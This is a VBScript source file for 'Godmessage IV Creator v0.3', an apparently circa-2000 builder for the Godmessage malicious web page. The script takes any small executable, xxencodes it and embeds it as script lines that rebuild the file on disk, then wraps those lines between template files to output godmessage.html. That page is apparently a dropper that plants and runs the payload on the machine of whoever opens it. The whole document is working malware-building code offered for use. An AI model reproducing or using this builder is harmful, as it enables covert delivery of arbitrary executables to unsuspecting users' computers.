'********************************************************************
' Godmessage IV Creator v0.3
' Author: 6IT
' Thanks: The Pull - Creator of the original Godmessage - this is his brain child.
' Thanks: StoneFisk - Coauthor of Godmessage IV.
' Thanks: To all the people who helped make godmessage what it is today
'
' CHANGE LOG 10-13-00
' - See Readme.txt
'********************************************************************
Dim Message, Title, Text1
Dim fso, WSHSHell, result
Message = "Enter the name of the executable to wrap in Godmessage IV" 
Title = "6IT's Godmessage IV Creator v0.3"
Text1 = "Sorry, user input was canceled"
Set fso = CreateObject("Scripting.FileSystemObject")
Set WSHShell = WScript.CreateObject("WScript.Shell")
Const ForReading = 1 
Const ForAppending = 8
result = InputBox(Message,Title,"onz.exe", 4000, 3000)
If result = "" Then
	WScript.Echo Text1
	WScript.Quit()
ElseIf result = "onz.exe" Then

	If fso.FileExists(result) Then 
		GMCreate()
	Else 
		WScript.Echo "File Doesn't Exist!"
		WScript.Quit()
	End If
Else
	If fso.FileExists(result) Then
		fso.CopyFile result, "onz.exe", True
		GMCreate()
	Else 
		WScript.Echo "File Doesn't Exist!"
		WScript.Quit()
	End If
End If
WScript.Echo "Success!"
WScript.Quit()

Sub GMCreate()
CheckSize()
CreateXXE()
CreateScript()
Join()
fso.DeleteFile "onz.xxe", True
fso.DeleteFile "output.txt", True
End Sub

Sub CheckSize()
Set fs = fso.GetFile("onz.exe")
fsize = fs.Size
If fsize > 34500 Then
WScript.Echo "File is Greater Than 34500 Bytes"
WScript.Quit()
End If
End Sub

Sub CreateXXE()
If fso.FileExists("onz.xxe") Then 
fso.DeleteFile "onz.xxe", True
End If
WSHShell.Run "%comspec% /c xxencode.com onz.exe",0,True
End Sub

Sub CreateScript()
Set input = fso.OpenTextFile("onz.xxe", ForReading) 
Set output = fso.CreateTextFile("output.txt", True)
nline = " & vbNewline"
s = input.ReadLine
fline1 = "l7 = ""set onzXxe=fso.CreateTextFile(" & Chr(34) & Chr(34) & "onz.xxe" & Chr(34) & Chr(34) & ")"""
fline2 = "l8 = ""onzXxe.WriteLine " & Chr(34) & Chr(34) & s & Chr(34) & Chr(34)
output.Write (fline1 & vbNewline & fline2 & nline)
Do While NOT input.AtEndOfStream
s = input.ReadLine
If s = "" Then
output.Write (nline)
Else
line = " & " & Chr(34) & Chr(34) & s & Chr(34) & Chr(34) 
output.Write (line & nline)
End IF
Loop
output.Write (Chr(34) & vbNewline)
output.Write ("l9 = ""onzXxe.close""" & vbNewline)
input.Close 
output.Close
End Sub


Sub Join() 

fso.CopyFile "gm1.dat", "godmessage.html", True
Set f1 = fso.OpenTextFile("godmessage.html", ForAppending)
Set f2 = fso.OpenTextFile("output.txt", ForReading)
Set f3 = fso.OpenTextFile("gm2.dat", ForReading)
dat1 = f2.ReadAll
dat2 = f3.ReadAll
f1.Write(dat1 & dat2)
f1.close
f2.close
f3.close
End Sub